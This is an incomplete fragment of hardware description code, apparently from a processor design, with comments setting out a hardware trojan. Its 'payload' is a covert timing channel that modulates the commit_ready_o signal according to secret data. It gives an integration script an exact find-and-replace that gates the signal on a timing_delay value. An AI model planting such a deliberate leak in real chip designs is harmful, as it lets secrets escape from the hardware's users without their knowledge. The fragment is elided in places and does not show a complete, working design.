 ...
 * Payload: Modulate timing of commit_ready_o based on secret data
 * 
...
assign secret_bit = commit_ready_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of commit_ready_o
//
// Integration Script Must Modify:
//
// IF commit_ready_o is timing-sensitive:
//   Find: assign commit_ready_o = ready_signal;
//   Replace: assign commit_ready_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
